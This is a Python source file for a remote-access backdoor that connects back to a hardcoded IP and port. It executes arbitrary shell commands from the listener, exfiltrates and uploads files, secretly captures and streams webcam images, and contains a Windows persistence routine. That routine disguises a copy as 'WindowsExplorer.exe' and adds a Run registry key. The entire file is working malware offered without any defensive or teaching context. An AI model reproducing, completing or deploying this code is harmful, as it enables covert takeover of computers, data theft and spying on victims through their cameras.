import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import cv2
import time
class Backdoor:
    def __init__(self, ip, port):
        #self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def stream_webcam(self):
        """Streams webcam frames to the listener."""
        try:
            # Initialize webcam
            camera = cv2.VideoCapture(0)
            if not camera.isOpened():
                self.reliable_send("[+] Webcam not accessible.")
                return

            while True:
                ret, frame = camera.read()
                if not ret:
                    self.reliable_send("[+] Failed to capture frame.")
                    break

                # Encode frame as JPEG and then base64 encode
                _, buffer = cv2.imencode('.jpg', frame)
                if buffer is None:
                    print("failed to encode frame.")
                frame_data = base64.b64encode(buffer).decode('utf-8')
                print(f"sending frame of size: {len(frame_data)} Bytes")
                # Send the frame data to the listener
                self.connection.sendall(frame_data.encode('utf-8'))
                time.sleep(0.005)

            camera.release()
        except Exception as e:
            self.reliable_send(f"Error during streaming: {str(e)}")


    def capture_image(self):
        try:
            # Open the camera (0 for default camera)
            camera = cv2.VideoCapture(0)
            if not camera.isOpened():
                return "[!] Unable to access the camera"

            # Capture a single frame
            ret, frame = camera.read()
            camera.release()

            if not ret:
                return "[!] Failed to capture image"

            # Save the frame as a temporary file
            image_path = "temp_image.jpg"
            cv2.imwrite(image_path, frame)

            # Read and encode the image in base64
            with open(image_path, "rb") as img_file:
                encoded_image = base64.b64encode(img_file.read())
            
            # Delete the temporary image file
            os.remove(image_path)
            return encoded_image
        except Exception as e:
            return f"[!] Error capturing image: {e}"
        

    def become_persistent(self):
        try:
            # Get the AppData folder
            appdata_path = os.environ.get("appdata")
            if not appdata_path:
                raise EnvironmentError("AppData environment variable not found.")
            
            # Define the target path for the file
            evil_file_loc = os.path.join(appdata_path, "WindowsExplorer.exe")
            
            # Check if the file already exists
            if not os.path.exists(evil_file_loc):
                # Copy the executable to the target location
                shutil.copyfile(sys.executable, evil_file_loc)
                
                # Add a registry key for persistence
                registry_command = (
                    f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                    f'/v update /t REG_SZ /d "{evil_file_loc}" /f'
                )
                subprocess.run(registry_command, shell=True, check=True)
            
            print("Persistence established successfully.")
        
        except Exception as e:
            print(f"Error establishing persistence: {e}")




    def reliable_send(self, data):
        """Send JSON-encoded data."""
        try:
            # Ensure that data is in the form of a string
            if isinstance(data, bytes):
                data = data.decode('utf-8')
            json_data = json.dumps(data)
            json_data = json_data.encode('utf-8')  # Ensure the data is bytes
            self.connection.sendall(json_data)  # Ensure the full data is sent
        except Exception as e:
            print(f"Error while sending data: {e}")

    def reliable_receive(self):
        """Receive JSON-encoded data in chunks and handle incomplete messages."""
        json_data = ""
        while True:
            try:
                # Receive data in chunks
                chunk = self.connection.recv(4096).decode('utf-8')
                
                # If no data is received (connection closed), return None
                if not chunk:
                    return None
                
                json_data += chunk
                
                # Try to decode the accumulated data
                try:
                    return json.loads(json_data)  # Try to load the complete JSON object
                except json.JSONDecodeError:
                    # If decoding fails, continue receiving more data
                    continue
            
            except Exception as e:
                # Handle unexpected exceptions
                print(f"Error receiving data: {e}")
                return None  # Return None or handle the error based on your logic


    def execute_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        except subprocess.CalledProcessError as e:
            return e.output
    def chaneg_working_dir_to(self, path):
        os.chdir(path)
        return "[+] changing the working directory to " + path
    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                data = base64.b64encode(file.read())
                print(f"[DEBUG] File read successfully: {len(data)} bytes")
                return data
        except FileNotFoundError:
            print("[ERROR] File not found.")
            return "[!] File not found."
        except PermissionError:
            print("[ERROR] Permission denied.")
            return "[!] Permission denied."
        except Exception as e:
            print(f"[ERROR] Unexpected error: {e}")
            return f"[!] Error: {e}"

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] upload is done"
    def run(self):
        try:
            while True:
                command_received = self.reliable_receive()
                if command_received is None:
                    continue
                if command_received[0].lower() == "exit":
                    self.connection.close()
                    sys.exit()
                elif command_received[0] == "cd" and len(command_received) > 1:
                    command_result = self.chaneg_working_dir_to(command_received[1])
                    self.reliable_send(command_result)
                elif command_received[0].lower() == "download":
                    command_result = self.read_file(command_received[1])
                    self.reliable_send(command_result)
                elif command_received[0] == "upload":
                    command_result = self.write_file(command_received[1], command_received[2])
                    self.reliable_send(command_result)
                elif command_received[0] == "camera":
                    command_result = self.capture_image()
                    self.reliable_send(command_result)
                elif command_received == "stream":
                    self.stream_webcam()
                else:
                    try:
                        command_result = self.execute_command(command_received)
                    except Exception as e:
                        command_result = str(e).encode('utf-8')
                    self.reliable_send(command_result)
        except Exception as e:
            print(f"Error: {e}")
        finally:
            self.connection.close()

try:
    my_Backdoor = Backdoor("192.168.8.109", 4444)
    my_Backdoor.run()
except Exception:
    sys.exit()
